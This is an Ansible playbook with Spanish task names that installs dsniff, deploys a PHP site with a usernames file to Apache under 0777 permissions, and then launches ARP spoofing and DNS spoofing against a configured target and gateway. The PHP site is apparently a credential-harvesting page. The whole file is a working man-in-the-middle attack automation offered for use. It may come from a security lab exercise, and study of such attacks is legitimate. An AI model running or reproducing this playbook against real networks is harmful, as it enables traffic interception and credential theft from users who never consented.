---

- name: Instalar dsniff
  ansible.builtin.package:
    name: dsniff
    state: present

- name: Block
  block:
    - name: Stat carpeta
      ansible.builtin.stat:
        path: /var/www/html
      register: carpeta

    - name: Eliminar carpeta
      ansible.builtin.file:
        path: /var/www/html
        state: absent
      when: carpeta.stat.exists

- name: Crear carpeta
  ansible.builtin.file:
    path: /var/www/html
    state: directory
    owner: "{{ owner }}"
    group: "{{ owner }}"
    mode: '0755'

- name: Copy to apache
  ansible.builtin.copy:
    src: "{{ item }}"
    dest: /var/www/html
  loop:
    - index.php
    - datos.php
    - css.css
    - usernames.txt

- name: Cambiar permisos
  ansible.builtin.file:
    path: /var/www/html
    owner: "{{ owner }}"
    group: "{{ owner }}"
    mode: '0777'
    recurse: true

# - name: Permitir write en Selinux
#   ansible.builtin.command:
#     chdir: /var/www/html
#     cmd: "{{ item }}"
#   loop:
#     - semanage fcontext -a -t httpd_sys_rw_content_t '/var/www/html/usernames.txt'
#     - restorecon -v '/var/www/html/usernames.txt'
#   when: ansible_os_family == "RedHat"

- name: "Reiniciar apache/httpd"
  ansible.builtin.service:
    name: "{{ servicio }}"
    state: restarted
        
- name: Copy fichero para dnsspoofing
  ansible.builtin.template:
    src: file_dns
    dest: /tmp/

- name: Ataque arpspoofing
  arp_dns_spoofing:
    interface: "{{ interface }}"
    target: "{{ target }}"
    gateway: "{{ gateway }}"
    state: arpspoofing
  async: 10000000000000000000000
  poll: 0

- name: Ataque dnsspoofing
  arp_dns_spoofing:
    interface: "{{ interface }}"
    file: /tmp/file_dns
    state: dnsspoofing
  async: 10000000000000000000000
  poll: 0
  
...